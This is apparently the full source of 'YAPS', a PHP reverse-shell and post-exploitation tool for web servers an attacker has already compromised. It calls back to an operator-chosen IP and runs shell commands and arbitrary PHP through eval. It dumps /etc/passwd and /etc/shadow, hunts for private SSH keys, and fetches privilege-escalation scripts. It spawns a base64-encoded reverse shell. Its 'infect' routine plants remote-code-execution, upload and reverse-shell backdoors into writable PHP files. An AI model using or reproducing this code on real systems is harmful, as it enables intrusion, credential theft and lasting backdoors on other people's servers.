<?php
# YAPS - Yet Another PHP Shell
# Version 1.3.1 - 01/08/21
# Made by Nicholas Ferreira
# https://github.com/Nickguitar/YAPS


//error_reporting(0);
$version = "1.3.1";
set_time_limit(0);
ignore_user_abort(1);
ini_set('max_execution_time', 0);
ini_set('default_socket_timeout', pow(99, 6)); //negative timeout value should set it to infinite, but it doesn't. =(

########################## CONFIGS ############################

$resources = array(
"linpeas"   => "https://raw.githubusercontent.com/carlospolop/privilege-escalation-awesome-scripts-suite/master/linPEAS/linpeas.sh",
"linenum"   => "https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh",
"suggester" => "https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh",
"verifyUpdateURL" => "https://raw.githubusercontent.com/Nickguitar/YAPS/main/version",
"updateURL" => "https://raw.githubusercontent.com/Nickguitar/YAPS/main/yaps.php");

$ip = '127.0.0.1';
$port = 7359;

$ps1_color = true; // colored prompt (prettier :)
$color = true; // prompt, banner, info colors (better readability)
$use_password = false; // only allows remote using the shell w/ password
// sha512("vErY_Go0d_$aLt".sha512("password123"))
$salt = 'v_3_r_Y___G_o_0_d___s_4_L_t';
$pass_hash = "f00945860424fa6148e329772c08e7d05d7fab6f69a4722b4c66c164acdb018ecc0cbc62060cc67e7ae962c65ab5967620622cc12206627229b94106b66db6b8"; // default: pass123
$auto_verify_update = false; // if true, will check on every run for update
$silent = false; //if true, does not display banner on connect

if(isset($_GET['vrfy'])) die("baguvix"); //verification

######################### END CONFIGS #########################

$yaps = $_SERVER['SCRIPT_FILENAME'];

// sets reverse socket via $_POST['x'] (stealthier, no IP on apache log request line)
if(isset($_POST['x']) && strpos($_POST['x'], ":") !== false){ 
	$skt = explode(":", $_POST['x']);
	$ip = $skt[0];
	$port = $skt[1];
}

$banner = cyan('
       o   o   O    o--o   o-o
        \ /   / \   |   ) (
         O   o---o  O--o   o-o
         |   |   |  |         )
         o   o   o  o     o--o
        Yet Another  PHP  Shell').'
              Version '.$version.'
       Coder: Nicholas Ferreira';

########################## PARSE ARGV ########################

$short_args = "u::h::s::";
$long_args = array("update::","help::","silent::");
$options = getopt($short_args, $long_args);

if(isset($options['h']) || isset($options['help'])) die(usage());
if(isset($options['u']) || isset($options['update'])) die(verify_update());
if(isset($options['s']) || isset($options['silent'])) $silent = true;	

if(php_sapi_name() == "cli"){ // if yaps is run via cli, parse args
	if($argc >= 2 && preg_match("/^[0-9]+$/", $argv[$argc-1])){ // $ php yaps.php 127.0.0.1 4444
		$port = $argv[$argc-1];
		$ip = $argv[$argc-2];
	}else{
		foreach($argv as $arg){
			if(strpos($arg, ":") !== false){ // if an argument is of the form .*:[0-9]+
				$socket = explode(":", $arg);
				$ip = $socket[0];
				$port = (int)$socket[1];
			}
		}
	}
}

##################### END ARGV PARSING ######################

$commands = array(
	"all-colors",
//	"backdoor",
	"color",
//	"download",
	"duplicate",
	"enum",
	"help",
	"infect",
	"info",
	"passwd",
	"php",
	"stabilize",
	"suggester"
//	"upload"
);


function green($str){
	global $color;
	return $color ? "\e[92m".$str."\e[0m" : $str;
}
function red($str){
	global $color;
	return $color ? "\e[91m".$str."\e[0m" : $str;
}
function yellow($str){
	global $color;
	return $color ? "\e[93m".$str."\e[0m" : $str;
}
function cyan($str){
	global $color;
	return $color ? "\e[96m".$str."\e[0m" : $str;
}
function white($str){
	global $color;
	return $color ? "\e[97m".$str."\e[0m" : $str;
}


function banner(){
	global $banner;
	return $banner.white('
   This is ').red('NOT').white(' an interactive shell.
       Use ').green('!help').white(' to see commands.');
}

function usage(){
	global $banner,$version;
	return $banner.'
'.yellow('Usage:').white('
There are three ways you can start the connection:
').green('1. Via command line in the compromised host;').'
	E.g: $ php yaps.php [options] [ip port|ip:port]
'.green('2. Making a POST request to the file with the parameter "x";').'
	E.g: $ curl -X POST -d "x=192.168.73.59:7359" hacked.com/uploads/yaps.php
'.green('3. Making a GET request without parameters (will connect to the hardcoded socket);').'
	E.g: $ curl hacked.com/uploads/yaps.php
'.yellow('Options:').white('
-h, --help:     Show this help
-s, --silent:   Silent mode (does not display banner)
-u, --update:   Check if YAPS is up to date
').yellow('Examples (suppose your IP is 192.168.73.59):').'
infected@host:~$ php yaps.php -s 192.168.73.59 4444
infected@host:~$ php yaps.php 192.168.73.59:8080
your@machine:~$ curl -X POST -d "x=192.168.73.59" hacked.com/uploads/yaps.php
';
}

function isAvailable($function){
	$dis = ini_get('disable_functions');
	if(!empty($dis)){
		$dis = preg_replace('/[, ]+/', ',', $dis);
		$dis = explode(',', $dis); // split by comma
		$dis = array_map('trim', $dis); //remove whitespace at the beginning and end
	}else{
		$dis = array();
	}
	
	if(is_callable($function) and !in_array($function, $dis))
		return true;
	return false;
}


function help(){

	$help = '
'.green('Useful commands:').'
  '.cyan('!help').'
  	Display this menu
  '.cyan('!all-colors').'
  	Toggle all colors (locally only)
  '.cyan('!color').'
  	Toggle $PS1 color (locally only)
  '.cyan('!duplicate').'
  	Spawn another reverse shell
  '.cyan('!enum').'
  	Download Linpeas and Linenum to /tmp and get it ready to run
  '.cyan('!infect').'
  	Inject payloads into PHP files
  '.cyan('!info').'
  	List information about target
  './*cyan('!download <target file>').'
  	Downloads file from target to your PC
  '.cyan('!upload <source> <destination>').'
  	Uploads a source file from your PC to target destination folder
  '.*/cyan('!passwd').'
  	Show options for password	
  '.cyan('!php').'
  	Write and run PHP code on the remote host
  '.cyan('!stabilize').'
  	Stabilize to an interactive shell
  '.cyan('!suggester').'
  	Download Linux Exploit Suggester to /tmp and get it ready to run
  
'.green('Command line options:').'
  '.white('$ php yaps.php [--update|-u]').'
  	Check if YAPS is up to date
  '.white('$ php yaps.php ip port').'
  	Connect to ip:port
';
	return $help;
}

function run_cmd($c){ // modified from msf

	$c = $c." 2>&1\n"; // stderr to stdout

	if(isAvailable('exec')){
		$stdout = array();
		exec($c, $stdout);
		$stdout = join(chr(10),$stdout).chr(10);
	}else if(isAvailable('shell_exec')){
		$stdout = shell_exec($c);
	}else if(isAvailable('popen')){
		$fp = popen($c, 'r');
		$stdout = NULL;
		if(is_resource($fp))
			while (!feof($fp))
				$stdout .= fread($fp, 1024);
		@pclose($fp);
	}else if(isAvailable('passthru')){
		ob_start();
		passthru($c);
		$stdout = ob_get_contents();
		ob_end_clean();
	}else if(isAvailable('proc_open')){
		$handle = proc_open($c, array(
			array('pipe','r') ,
			array('pipe','w') ,
			array('pipe','w')
		) , $pipes);
		$stdout = NULL;
		while (!feof($pipes[1]))
			$stdout .= fread($pipes[1], 1024);
		@proc_close($handle);
	}else if(isAvailable('system')){
		ob_start();
		system($c);
		$stdout = ob_get_contents();
		ob_end_clean();
	}else{
		$stdout = 0;
	}
	return $stdout;
}

$ps1 = "[YAPS] ".str_replace(PHP_EOL,"",green(run_cmd("whoami")."@".run_cmd("hostname")).":".cyan(run_cmd("pwd"))."$ "); // user@hostname:~$

function sysinfo(){
	global $s;
	fwrite($s,green("\n====================== Initial info ======================\n\n"));
	$info  = cyan("[i] OS info:\n").run_cmd("lsb_release -a | grep -v 'No LSB'").PHP_EOL;

	$info .= cyan("[i] Hostname: ").run_cmd("hostname");
	$info .= cyan("[i] Kernel: ").run_cmd("uname -a");
	$info .= cyan("[i] CPU: \n").run_cmd("cat /proc/cpuinfo | grep -i 'model name' | cut -d':' -f 2 | sed 's/^ *//g'");
	$info .= cyan("[i] RAM: \n").run_cmd("cat /proc/meminfo | egrep -i '(memtotal|memfree)'");
	$info .= cyan("[i] Sudo version: ").run_cmd("sudo --version | grep 'Sudo version' | cut -d' ' -f 3");
	$info .= cyan("[i] User/groups: ").run_cmd("id").PHP_EOL;
	$info .= cyan("[i] Active TTY: \n").run_cmd("w").PHP_EOL;
	fwrite($s, $info);

	fwrite($s,green("====================== Users info ======================\n\n"));
	$info  = cyan("[i] Current user: ").run_cmd("whoami");
	$info .= cyan("[i] Users in /home: \n").run_cmd("ls /home").PHP_EOL;
	$info .= cyan("[i] Crontab of current user: \n").run_cmd("crontab -l | egrep -v '^#'").PHP_EOL;
	$info .= cyan("[i] Crontab: \n").run_cmd("cat /etc/crontab | egrep -v '^#'").PHP_EOL;
	fwrite($s, $info);

	fwrite($s,green("====================== All users ======================\n\n"));
	fwrite($s, run_cmd("cat /etc/passwd").PHP_EOL);
	if(is_readable("/etc/shadow"))
		fwrite($s, red("[!] /etc/shadow is readable!\n").run_cmd("cat /etc/shadow").PHP_EOL);

	fwrite($s, green("====================== Net info ======================\n\n"));
	$info  = cyan("[i] IP Info: \n").run_cmd("ifconfig").PHP_EOL;
	$info .= cyan("[i] Hosts: \n").run_cmd("cat /etc/hosts | grep -v '^#'").PHP_EOL; // /etc/hosts file
	$info .= cyan("[i] Interfaces/routes: \n").run_cmd("cat /etc/networks && route").PHP_EOL;
	$info .= cyan("[i] IP Tables rules: \n").run_cmd("(iptables --list-rules 2>/dev/null)").PHP_EOL;
	$info .= cyan("[i] Active ports: \n").run_cmd("(netstat -punta) 2>/dev/null").PHP_EOL; //established, listening, 0.0.0.0, 127.0.0.1
	fwrite($s, $info);

	fwrite($s, green("====================== Interesting binaries ======================\n\n"));
	$interesting_binaries = array('nc','nc.traditional','ncat','nmap','perl','python','python2','python2.6','python2.7','python3','python3.6','python3.7','ruby','node','gcc','g++','docker','php');
	foreach($interesting_binaries as $binary) {
		$binary = shell_exec("which $binary 2>/dev/null");
		if($binary !== "" && base64_encode($binary.PHP_EOL) !== "Cg==") // if not empty or newline
			fwrite($s, run_cmd("ls -l $binary"));
	}

	fwrite($s, green("\n====================== SUID binaries ======================\n\n"));
	$suid_list = explode("\n",shell_exec("find / -type f -perm /4000 2>/dev/null"));
	foreach($suid_list as $suid)
		if($suid !== "")
			fwrite($s, run_cmd("ls -l $suid"));

	fwrite($s, green("\n====================== SSH files ======================\n\n"));
	$authorized_keys = explode("\n",shell_exec("find / -type f -name authorized_keys 2>/dev/null")); // search for authorized_keys file
	foreach($authorized_keys as $public_key)
		if(is_writable($public_key))
			fwrite($s, red("[Writable] ").$public_key.PHP_EOL);
		else
			fwrite($s, $public_key.PHP_EOL);
	$id_rsa = explode("\n",shell_exec("find / -type f -name id_rsa 2>/dev/null")); // search for id_rsa files
	foreach($id_rsa as $priv_key)
		if(is_readable($priv_key))
			fwrite($s, red("[Readable] ").$priv_key.PHP_EOL);
		else
			fwrite($s, $priv_key.PHP_EOL);

	fwrite($s, green("\n=================== Writable PHP files ===================\n\n"));
	$webfiles_arr = array();
	$webdir = array('/var/www','/srv','/usr/local/apache2','/var/apache2','/var/www/nginx-default');
	foreach($webdir as $dir)
		$webfiles_arr = array_merge($webfiles_arr, explode("\n", shell_exec("find ".$dir." -type f -name '*.php*' -writable 2>/dev/null")));


	if(count($webfiles_arr) > 25){
		for($i=0;$i<25;$i++)
			if($webfiles_arr[$i] !== "")
				fwrite($s, red("[Writable] ").$webfiles_arr[$i].PHP_EOL);
		fwrite($s, "...\n...".PHP_EOL);
		fwrite($s, green("[+] "). "Showing only the first 25 files. There are more!".PHP_EOL);
	}else{
		foreach($webfiles_arr as $file)
			if($file !== "")
				fwrite($s, red("[Writable] ").$file.PHP_EOL);
	}
	fwrite($s, cyan("\n[i]")." Get more information with !enum.".PHP_EOL);
}

function random_name($name = ""){
    $charset = 	implode("",array_merge(range("A", "Z"), range("a","z"), range(0,9))); // merge arrays and join them into a string
    for($i=0;$i<=mt_rand(5,6);$i++)
            $name .= $charset[mt_rand(0,strlen($charset)-1)];
    return $name;
}

function download($url, $saveTo){ //download file from $url to $saveTo
	$randomName = random_name();
	$content = get_request($url);

	if(isAvailable('file_put_contents'))
		if(file_put_contents($saveTo."/".$randomName,$content)) return $randomName;
	if(isAvailable('fopen') && isAvailable('fwrite') && isAvailable('fclose')){
		$fp = fopen($saveTo."/".$randomName, "w");
		if(fwrite($fp, $content)){
			fclose($fp);
			return $randomName;
		}
	}
	return false;
}

function enum(){ //download linpeas, save to /tmp and change its permission to 777
	global $s, $resources;
	$downloadLinpeas = download($resources["linpeas"], "/tmp/");
	$downloadLinenum = download($resources["linenum"], "/tmp");
	if($downloadLinpeas){
		fwrite($s, green("[+]")." Linpeas saved to /tmp/".$downloadLinpeas.cyan("\n[i] Changing permissions...\n"));
		if(chmod("/tmp/".$downloadLinpeas, 777))
			fwrite($s, green("[+]")." Permissions changed! \n[i] You can run it with ".yellow("sh /tmp/".$downloadLinpeas." | tee /tmp/linpeas.log\n\n"));
		else
			fwrite($s, yellow("[!]")." Couldn't change permissions... \n[i] File was saved in ".yellow("/tmp/".$downloadLinpeas."\n\n"));
	}
	if($downloadLinenum){
		fwrite($s, green("[+] Linenum saved to /tmp/".$downloadLinenum).cyan("\n[i] Changing permissions...\n"));
		if(chmod("/tmp/".$downloadLinenum, 777))
			fwrite($s, green("[+]")." Permissions changed! \n[i] You can run it with ".yellow("sh /tmp/".$downloadLinenum." | tee /tmp/linenum.log\n"));
		else
			fwrite($s, yellow("[!]")." Couldn't change permissions... \n[i] File was saved in ".yellow("/tmp/".$downloadLinenum."\n"));
	}
}

function suggester(){//download linux exploit suggester, save to /tmp and change its permission to 777
	global $s, $resources;
	$download = download($resources["suggester"], "/tmp/");
	if($download){
		fwrite($s, green("[+]")." Linux Exploit Suggester saved to /tmp/".$download.cyan("\n[i]")." Changing permissions...\n");
		if(chmod("/tmp/".$download, 777))
			fwrite($s, green("[+]")." Permissions changed! \n[i] You can run it with ".yellow("sh /tmp/".$download." | tee /tmp/LES.log\n"));
		else
			fwrite($s, yellow("[!]")." Couldn't change permissions... \n[i] File was saved in ".yellow("/tmp/".$download."\n"));
	}
	return;
}

function refresh_ps1($changecolor=false){ //build a nice PS1, toggle between colored and not colored
	global $ps1_color,$ps1;
	$user = str_replace(PHP_EOL, "", run_cmd("whoami"));

	if(!$ps1_color){
		$ps1 = white("[YAPS] ").str_replace(PHP_EOL,"",green($user."@".run_cmd("hostname")).":".cyan(run_cmd("pwd"))."$ "); // user@hostname:~$
		if($user == "root") $ps1 = white("[YAPS] ").str_replace(PHP_EOL,"",red($user."@".run_cmd("hostname")).":".cyan(run_cmd("pwd"))."# "); // root@hostname:~#
		if($changecolor) $ps1_color = true;
	}else{
		$ps1 = white("[YAPS] ").str_replace(PHP_EOL,"",$user."@".run_cmd("hostname").":".run_cmd("pwd")."$ "); // user@hostname:~$
		if($user == "root") $ps1 = white("[YAPS] ").str_replace(PHP_EOL,"",$user."@".run_cmd("hostname").":".run_cmd("pwd")."# "); // root@hostname:~#
		if($changecolor) $ps1_color = false;
	}
}

function getPHP(){ //receive PHP code via socket
	global $s;
	$php = '';
	fwrite($s, cyan("[*]")." Write your PHP code (*without* PHP tags). To send and run it, use ".green("!php").". ".yellow("\n[i] Note that this is NOT an interactive PHP shell. Max input: 4096 bytes.").white("\nphp> "));
	while($c = fread($s, 4096)){
		if(substr($c,0,-1) == "!php") // remove newline at end
			return $php;
		if(substr($c,0,-1) == "!cancel") // remove newline at end
			return 0;
		fwrite($s, white("php> ")); //prompt
		$php .= $c; // append received line to the whole php code to be executed
	}
	return $php;
}

function runPHP($code){ // guess what
	try{
		ob_start();
		eval($code); // do the magic
		$result = ob_get_contents(); //get buffer from eval() to return later
		ob_end_clean();
	}catch (Throwable $ex){
		$err = explode("Stack trace:", $ex);
		$result = $err[0]; //return the error
	}
	return $result;
}

function stabilize($post_socket=""){ // spawn an interactive shell
	global $s, $port, $ip;

	$payload = "JHNjcmlwdD1zaGVsbF9leGVjKCJ3aGljaCBzY3JpcHQiKTskcHkzPXNoZWxsX2V4ZWMoIndoaWNoIHB5dGhvbjMiKTskcHk9c2hlbGxfZXhlYygid2hpY2ggcHl0aG9uIik7aWYoc3RybGVuKCRzY3JpcHQpPjYgJiYgc3RycG9zKCRzY3JpcHQsIm5vdCBmb3VuZCIpPT1mYWxzZSkgJHN0YWJpbGl6ZXI9Ii9iaW4vYmFzaCAtY2kgJyIuJHNjcmlwdC4iIC1xYyAvYmluL2Jhc2ggL2Rldi9udWxsJyI7ZWxzZSBpZihzdHJsZW4oJHB5Myk+NyAmJiBzdHJwb3MoJHNjcmlwdCwibm90IGZvdW5kIik9PWZhbHNlKSAkc3RhYmlsaXplcj0kcHkzLiIgLWMgJ2ltcG9ydCBwdHk7cHR5LnNwYXduKFwiL2Jpbi9iYXNoXCIpJyI7ZWxzZSBpZihzdHJsZW4oJHB5KT42ICYmIHN0cnBvcygkc2NyaXB0LCJub3QgZm91bmQiKT09ZmFsc2UpICRzdGFiaWxpemVyPSRweS4iIC1jICdpbXBvcnQgcHR5O3B0eS5zcGF3bihcIi9iaW4vYmFzaFwiKSciO2Vsc2UgJHN0YWJpbGl6ZXI9Ii9iaW4vYmFzaCI7JHN0YWJpbGl6ZXI9c3RyX3JlcGxhY2UoIlxuIiwiIiwkc3RhYmlsaXplcik7JHNoZWxsPSJ1bmFtZSAtYTskc3RhYmlsaXplciI7dW1hc2soMCk7JHNvY2s9ZnNvY2tvcGVuKCJJUF9BRERSIixQT1JULCRlcnJubywkZXJyc3RyLDMwKTskc3RkPWFycmF5KCAwID0+IGFycmF5KCJwaXBlIiwiciIpLDEgPT4gYXJyYXkoInBpcGUiLCJ3IiksMiA9PiBhcnJheSgicGlwZSIsInciKSApOyRwcm9jZXNzPXByb2Nfb3Blbigkc2hlbGwsJHN0ZCwkcGlwZXMpO2ZvcmVhY2goJHBpcGVzIGFzICRwKSBzdHJlYW1fc2V0X2Jsb2NraW5nKCRwLDApO3N0cmVhbV9zZXRfYmxvY2tpbmcoJHNvY2ssMCk7d2hpbGUoIWZlb2YoJHNvY2spKXskcmVhZF9hPWFycmF5KCRzb2NrLCRwaXBlc1sxXSwkcGlwZXNbMl0pO2lmKGluX2FycmF5KCRzb2NrLCRyZWFkX2EpKSBmd3JpdGUoJHBpcGVzWzBdLGZyZWFkKCRzb2NrLDIwNDgpKTtpZihpbl9hcnJheSgkcGlwZXNbMV0sJHJlYWRfYSkpIGZ3cml0ZSgkc29jayxmcmVhZCgkcGlwZXNbMV0sMjA0OCkpO2lmKGluX2FycmF5KCRwaXBlc1syXSwkcmVhZF9hKSkgZndyaXRlKCRzb2NrLGZyZWFkKCRwaXBlc1syXSwyMDQ4KSk7fSBmY2xvc2UoJHNvY2spO2ZvcmVhY2goJHBpcGVzIGFzICRwKSBmY2xvc2UoJHApO3Byb2NfY2xvc2UoJHByb2Nlc3MpOw==";// modified php-reverse-shell (works w/ sudo, mysql, ftp, su, etc.) 

	if(strlen($post_socket) > 1 && strlen($post_socket) > 0){ //if is set
		echo $post_socket;
		$skt = explode(":", $post_socket);
		$post_ip = $skt[0];
		$post_port = $skt[1];
		$final_payload = base64_encode(str_replace("IP_ADDR", $post_ip, str_replace("PORT", $post_port, base64_decode($payload)))); // changes payload to add correct socket
		shell_exec("echo ".$final_payload."| base64 -d | php -r '\$stdin=file(\"php://stdin\");eval(\$stdin[0]);'");
		return;
	}

	fwrite($s, yellow("[i]")." Set up a listener on another port (nc -lnvp <port>) and press ENTER.\nChoose a port: ");
	while($c = fread($s, 8)){ //reads [ENTER]
		if(strlen($c) > 0){ // got [ENTER]
			$recv_port = (int)$c; // get the integer part
			if($recv_port>65535 || $recv_port==0){
				fwrite($s,red("[-]")." Port must be between 0-65535.\nChoose another port: ");
			}else{
				$final_payload = base64_encode(str_replace("IP_ADDR", $ip, str_replace("PORT", $recv_port, base64_decode($payload)))); // changes payload to add correct socket
				fwrite($s, yellow("[i]")." Trying to connect to $ip:$recv_port\n");
				
				if(isAvailable("popen") && isAvailable("pclose")){
					pclose(popen("echo ".$final_payload."| base64 -d | php -r '\$stdin=file(\"php://stdin\");eval(\$stdin[0]);' &",'r')); // does the magic
					return;
				}
				// in case we don't have popen or pclose
				$curl_url = $_SERVER["REQUEST_SCHEME"]."://".$_SERVER["HTTP_HOST"].$_SERVER["REQUEST_URI"]; // htt(p|ps) :// website.com /files/yaps.php
				run_cmd("timeout --kill-after 0 1 wget --post-data=\"x=$ip:$recv_port&stabilize=1\" $curl_url > /dev/null"); // thx znttfox =)
				return;
			}
		}
	}
}

function backdoor(){
// todo
}

function check_password(){ //ask for password and return 0 or 1
	global $s, $pass_hash, $salt;
	fwrite($s, yellow("[i] ")."This shell is protected. \nEnter the password: ");
	while($data = fread($s,1024)){
		$entered_pass = substr($data,0,-1); //remove newline at end
		return hash("sha512", $salt.hash("sha512",$entered_pass, false), false) == $pass_hash ? true : false;
	}
}

function change_password($new){
	global $salt, $yaps, $s;
	$new_hash = hash("sha512", $salt.hash("sha512",$new, false), false);
	if(!is_readable($yaps) || !is_writable($yaps)) return false; //someone changed the permission
	$yaps_code = file_get_contents($yaps);
	$new_yaps_code = preg_replace('/[a-f0-9]{128}/', $new_hash, $yaps_code, 1); // the password hash is be the first thing this regex should match
	if(file_put_contents($yaps, $new_yaps_code)){
		fwrite($s, green("[+] ")."Password changed. Changes will take effect on next connection.\n");
		return true;
	}else{
		fwrite($s, red("[-] ")."Couldn't read or write the file. Are the permissions right?\n" . run_cmd("ls -l ".$yaps."\n"));
		return false;
	}
}

function toggle_password(){
	global $use_password, $s, $yaps;
	$yaps_code = file_get_contents($yaps);
	if($use_password){ //password currently active
		$new_yaps_code = preg_replace('/(\$use_password += +)(true)/', '$1false', $yaps_code, 1);
		if(file_put_contents($yaps, $new_yaps_code)){
			$use_password = false;
			fwrite($s, green("[+] ")."Password deactivated.\n");
			return true;
		}
		fwrite($s, red("[-] ")."Couldn't deactivate password.\n");
		return false;
	}
	// will enter here if $use_password is false
	$new_yaps_code = preg_replace('/(\$use_password += +)(false)/', '$1true', $yaps_code, 1); //limit must be 1
	if(file_put_contents($yaps, $new_yaps_code)){
		$use_password = false; // if limit isn't 1, this will be changed to false too
		fwrite($s, green("[+] ")."Password activated.\n");
		return true;
	}
	fwrite($s, red("[-] ")."Couldn't activate password.\n");
	return false;
}

function passwd(){
	global $s,$use_password;
	if($use_password){
		if(!check_password()){
			fwrite($s, red("[-] ")." Wrong password\n");
			return;
		} 
		fwrite($s, green("[+] Password is enabled. ").white("Choose an option:")."\n[1] Change password\n[2] Disable password\n[3] Cancel\n> ");
		while($data = fread($s, 8)){
			switch(substr($data, 0, -1)){
				case "1": // change password
					fwrite($s,cyan("[*] ")."Choose the new password: ");
					while($data2 = fread($s, 1024)){
						$newPass = substr($data2, 0, -1); //remove newline at end
						change_password($newPass);
						return;
					}
				break;

				case "2": // disable password
					toggle_password();
					return;
				break;

				default:
					fwrite($s, cyan("[*] ")."Canceled.\n");
					return;
				break;
			}
		}
	}else{ // no password required
		fwrite($s, yellow("[!] Password is disabled. ").white("Choose an option:")."\n[1] Set a password\n[2] Enable password\n[3] Cancel\n> ");
		while($data = fread($s, 8)){
			switch(substr($data, 0, -1)){
				case "1": // set a new password
				fwrite($s,cyan("[*] ")."Choose the new password: ");
				while($data2 = fread($s, 1024)){
					$newPass = substr($data2, 0, -1); //remove newline at end
					change_password($newPass);
					return;
				}
				break;

				case "2": // enable password
					toggle_password();
					return;
				break;
				
				default:
					fwrite($s, cyan("[*] ")."Canceled.\n");
					return;
				break;
			}
		}
	}
}

function duplicate(){
	global $s,$ip,$port,$_SERVER;

	if(!isset($_SERVER["REQUEST_SCHEME"]) || !isset($_SERVER["HTTP_HOST"]) || !isset($_SERVER["REQUEST_URI"])){
		fwrite($s, yellow("[-] ")."Couldn't find YAPS URL. Did you run me via command line?\nPlease provide the correct YAPS URL (example.com/files/yaps.php): ");
		while($yaps_url = fread($s, 256)){
			if(get_request(preg_replace("/\n/", "",$yaps_url."?vrfy")) !== "baguvix")
				return fwrite($s, red("[-] ")."Couldn't validade YAPS URL. Is this the correct URL?\n");
		break;
		}
		$curl_url = $yaps_url;
	}else{
		$curl_url = $_SERVER["REQUEST_SCHEME"]."://".$_SERVER["HTTP_HOST"].$_SERVER["REQUEST_URI"]; // htt(p|ps) :// website.com /files/yaps.php
		echo $curl_url;
	}

	fwrite($s, cyan("[*] ")."Choose a port to listen (default: $port): ");

	while($new_port = fread($s, 32)){
		$new_port = (base64_encode($new_port) == "Cg==") ? $port: substr($new_port,0,-1); //if new_port= newline, new_port = old port
		$socket = array('x' => $ip.":".$new_port);
		fwrite($s, "Connecting to ".$ip.":".$new_port."\n");
		$cmd = "wget -qO- --post-data=\"".http_build_query($socket)."\" $curl_url > /dev/null";
		if(isAvailable("popen") && isAvailable("pclose"))
			pclose(popen($cmd." &",'r')); // doesn't wait for wget to return
		else
			run_cmd("timeout --kill-after 0 1 ".$cmd); // thx znttfox =)
		return;
	}
}

function get_request($url){ //todo: change download function
	$response = false;
	if(isAvailable("file_get_contents")){
		$response = file_get_contents($url);
	}elseif(isAvailable("fread") && isAvailable("fopen") && ini_get("allow_url_fopen")){
		$response = fread(fopen($url, "r"),10);
	}elseif(in_array("curl",get_loaded_extensions())){
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        $response = curl_exec($ch);
        curl_close($ch);
    }elseif($tmp_curl = run_cmd("curl -s ".$url)){
		$response = $tmp_curl;
	}elseif($tmp_wget = run_cmd("wget -qO- ".$url)){
		$response = $tmp_wget;
    }
	return $response;
}

function verify_update(){
	global $version, $resources;
	$newest_version = 0;
	echo cyan("[i] ")."Your version: $version. Checking for updates...\n";
	$request = get_request($resources["verifyUpdateURL"]);
	if($request) $newest_version = $request;

	$newest_version_ = (int)str_replace(".","",$newest_version); //get only numbers
	$version_ = (int)str_replace(".","",$version);

	if($newest_version_ !== 0 && $newest_version_ > $version_){
		echo red("[i]")." Your version is not up to date.\n".green("[DOWNLOAD v".str_replace("\n","",$newest_version)."]: ").$resources["updateURL"]."\n";
		return;
	}
	echo green("[+] ")."YAPS is already up to date (v$version)!\n";
	return;
}

function getFiles($dir){ // return writable php files on webserver root
	$iterator = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($dir)); //list recursively
	$list = array();
	foreach($iterator as $file)
	    if(!is_dir($file) && is_writable($file)) //list only writable files
	    	if($file->getPathName() !== $_SERVER["SCRIPT_FILENAME"]) //remove myself from list
	    		if(substr($file->getPathName(),-4) == ".php") //list only php files
	    			array_push($list,$file->getPathName());
	sort($list);
	return $list;
}

function select_files(){
	global $s;

	$webdir = array('/var/www/','/srv/','/usr/local/apache2/','/var/apache2/','/var/www/nginx-default/');
	$webfiles_arr = array();
	foreach($webdir as $dir)
		try{
			$list = getFiles($dir);
			$webfiles_arr = array_merge($webfiles_arr,$list);
		}catch(Exception $e){}

	if(count($webfiles_arr) > 0) fwrite($s, cyan("[*] ").white("Found ".count($webfiles_arr)." writable PHP files:\n"));

	for($i=0;$i<count($webfiles_arr);$i++)
		fwrite($s, red("[$i] ").$webfiles_arr[$i].PHP_EOL);

	fwrite($s,cyan("\n[*] ").white("Choose the files you want to infect.\n    Separate by comma (e.g:1,5,7,8) and/or by range (e.g:10-16).\n    Files: "));

	while($data2 = fread($s, 1024)){ //receive numbers and parse
		$files = str_replace(" ", "", substr($data2, 0, -1)); //remove whitespaces and newline at end
		$files = explode(",",$files); //split 
		if(count($files) == 1 && $files[0] == "") return; //no file selected
		$toInfect = array();
		foreach($files as $file){
			if(preg_match("/^[0-9]+$/",$file)) // filter numbers
				array_push($toInfect, $file);

			if(preg_match("/^[0-9]+\-[0-9]+$/",$file)){ // filter ranges
				$range = explode("-",$file); // ex:4-6   ->  $range[0]=4, $range[1]=6
				if((int)$range[0] < (int)$range[1]) // 4 must be < than 6
					for($i=(int)$range[0];(int)$i<=$range[1];$i++) // from i=4 to i=6
						array_push($toInfect, $i);
			}
		}
		sort($toInfect,SORT_NUMERIC);
		choose_payload($webfiles_arr,array_unique($toInfect)); //remove duplicates
		return;
	}
}

function choose_payload($allFiles,$toInfect){
	global $s;
	$payloads = array(
		//curl -d "0=whoami" website.com/infected_file.php
		//curl website.com/infected_file.php?0=whoami
		"0. TinyRCE	" => '<?=`$_REQUEST[0]`;?>',
		
		//same
		"1. ClassicRCE	" => '<?=@system($_REQUEST[0]);?>',
		
		//curl -d "0=phpinfo();" website.com/infected_file.php
		"2. Eval		" => '<?=@eval($_REQUEST[0]);?>',

		//curl -d "0=cGhwaW5mbygpOw==" website.com/infected_file.php  (encoded phpinfo())
		"3. BasedEval	" => '<?=@eval(base64_decode($_REQUEST[0]));?>',
		
		//curl -d "0=c2.com/file_to_be_executed.txt" website.com/infected_file.php
		"4. RemotePHP	" => '<?=@eval(file_get_contents($_REQUEST[0]));?>',
		
		//curl -d "0=c2.com/file_to_upload&1=extension" website.com/infected_file.php
		"5. RemoteUpload	" => '<?=$x=rand(100,999);@file_put_contents("./".$x.".".$_REQUEST[1],@file_get_contents($_REQUEST[0]));echo $x.$_REQUEST[1];?>',
		
		//curl -F "0=@file_to_upload.php" website.com/infected_file.php
		"6. LocalUpload	" => '<?php if(isset($_FILES["0"]))if(move_uploaded_file($_FILES["0"]["tmp_name"],"_".$_FILES["0"]["name"]))echo"Uploaded: _".$_FILES["0"]["name"];?>',

		//curl "0=your_ip&1=port" website.com/infected_file.php
		"7. StableShell	" => '<?php $a="script -qc /bin/bash /dev/null";umask(0);$b=fsockopen($_REQUEST[0],$_REQUEST[1],$c,$d,30);$e=array(0=>array("pipe","r"),1=>array("pipe","w"),2=>array("pipe","w"));$f=proc_open($a,$e,$g);foreach($g as $p)stream_set_blocking($p,0);stream_set_blocking($b,0);while(!feof($b)){$i=array($b,$g[1],$g[2]);if(in_array($b,$i))fwrite($g[0],fread($b,2048));if(in_array($g[1],$i))fwrite($b,fread($g[1],2048));if(in_array($g[2],$i))fwrite($b,fread($g[2],2048));}fclose($b);foreach($g as $p)fclose($p);proc_close($f);?>'
	);

